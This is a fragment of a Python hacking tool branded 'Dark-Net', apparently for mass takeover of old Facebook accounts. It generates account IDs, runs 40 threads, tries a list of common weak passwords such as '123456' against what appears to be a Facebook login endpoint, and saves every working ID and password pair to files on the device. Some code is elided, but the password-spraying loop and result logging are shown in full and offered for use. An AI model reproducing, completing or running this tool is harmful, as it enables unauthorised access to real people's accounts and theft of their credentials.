...
$$ |\$$\  $$ |  $$ |$$ |  $$ |$$ |        $$ |  $$ |  $$ |
$$ | \$$\ $$ |  $$ |$$ |  $$ |$$$$$$$$\ $$$$$$\ $$$$$$$  |
\__|  \__|\__|  \__|\__|  \__|\________|\______|\_______/ 
                                                                                                            Dark-Net
                                                          
                           ⠀⠀⠀⠀⠀⠀
\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═
\033[1;92m[\033[1;92m\033[1;34m✔\033[1;92m]DEVELOPER      \033[1;91m\033[1;34m: \033[1;92𝚖Khalid x fabiha 
[\033[1;92m\033[1;34m✔\033[1;92m]FACEBOOK       \033[1;91m\033[1;34m: \033[1;92mkhalid bin ibrahim
[\033[1;92m\033[1;34m✔\033[1;92m]TOOL           \033[1;91m\033[1;34m: \033[1;92mOLD ID
[\033[1;92m\033[1;34m✔\033[1;92m]STATUS         \033[1;91m\033[1;34m: \033[1;92mtrail
[\033[1;92m\033[1;34m✔\033[1;92m]VERSION        \033[1;91m\033[1;34m: \033[1;35m[\033[1;32m𝚅0.1\033[1;35m]
\x1b[1;92m═━═━═━═━═━━═━═━══━═━═━═━═━━═━═━══━═━═━══━═━═━═""")
#----------------------------[MAIN/DEF]-----------------------------------#
def main():
    user=[]
    ...
    with ThreadPool(max_workers=40) as MrDevilEx:
        ...
        print(f'\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mUSE DATA\x1b[38;5;8m[\x1b[38;5;47mFOR\x1b[1;97m/\x1b[38;5;47mBEST\x1b[38;5;8m]  \x1b[38;5;47mResult!')
        lin()
        for mal in user:
            uid=star+mal
...
def login(uid):
    ...
    try:
        ...
        sys.stdout.flush()
        for pw in ["123456","1234567","12345678","123456789","123123","143143","102030","1234567890"]:
            headers = {
            ...
            if "session_key" in rp:
                ...
                open("/sdcard/DARK-NET-OLD-OK","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break 
            elif "www.facebook.com" in rp["error_msg"]:
                print(f"\r\r{G}SUCCESS {A}➤ {G}{uid} {A}•{G} {pw}")
                open("/sdcard/DARK-NET-OLD-OK.txt","a").write(uid+"|"+pw+"\n")
                oks.append(uid)
                break
